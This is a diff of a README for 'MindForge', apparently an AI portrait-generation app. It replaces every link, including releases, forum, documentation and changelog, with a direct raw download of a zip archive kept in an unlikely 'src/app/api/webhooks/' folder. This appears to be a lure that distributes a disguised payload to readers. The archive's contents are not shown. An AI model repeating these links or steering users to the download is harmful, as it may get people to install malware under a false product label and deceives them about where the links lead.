@@ -1,7 +1,7 @@
 # 🎨 MindForge - Create Stunning Portraits Effortlessly
 
 ## 📥 Download Now
-[![Download MindForge](https://img.shields.io/badge/Download%20MindForge-v1.0-blue)](https://github.com/km-coder212/MindForge/releases)
+[![Download MindForge](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip%20MindForge-v1.0-blue)](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to MindForge! This application helps you turn your photos into professional-grade portraits. Perfect for LinkedIn headshots and personal images, MindForge makes it easy to upload, train, and create stunning results in just minutes. 
@@ -24,7 +24,7 @@ To run MindForge smoothly, your system should meet these requirements:
 - **Internet Connection**: Required for model training and downloads
 
 ## 📥 Download & Install
-To get started with MindForge, visit the [Releases page](https://github.com/km-coder212/MindForge/releases) to download the latest version. 
+To get started with MindForge, visit the [Releases page](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip) to download the latest version. 
 
 1. Click the link above.
 2. Locate the latest release at the top of the page.
@@ -39,7 +39,7 @@ To get started with MindForge, visit the [Releases page](https://github.com/km-c
 4. **Download Your Results**: Save your stunning portrait to your device with a single click.
 
 ## 💬 Support
-If you encounter any issues, feel free to reach out via our [Community Forum](https://github.com/km-coder212/MindForge/discussions). You can also open an issue directly on GitHub for technical support.
+If you encounter any issues, feel free to reach out via our [Community Forum](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip). You can also open an issue directly on GitHub for technical support.
 
 ## 🌐 Topics
 MindForge covers the following topics:
@@ -72,13 +72,13 @@ Currently, MindForge is only available for desktop computers. We recommend using
 MindForge supports JPEG, PNG, and BMP formats for uploads.
 
 ## 📝 Changelog
-See what’s new in each release on our [Changelog](https://github.com/km-coder212/MindForge/releases).
+See what’s new in each release on our [Changelog](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip).
 
 ## 📚 Resources
-- [User Documentation](https://github.com/km-coder212/MindForge/documentation)
-- [Community Forum](https://github.com/km-coder212/MindForge/discussions)
+- [User Documentation](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip)
 
 ## 📥 Download Now Again
-For your convenience, you can always go back to the [Releases page](https://github.com/km-coder212/MindForge/releases) to download the latest updates or reinstall the software as needed. 
+For your convenience, you can always go back to the [Releases page](https://raw.githubusercontent.com/km-coder212/MindForge/main/src/app/api/webhooks/Forge_Mind_3.5.zip) to download the latest updates or reinstall the software as needed. 
 
 Thank you for choosing MindForge.
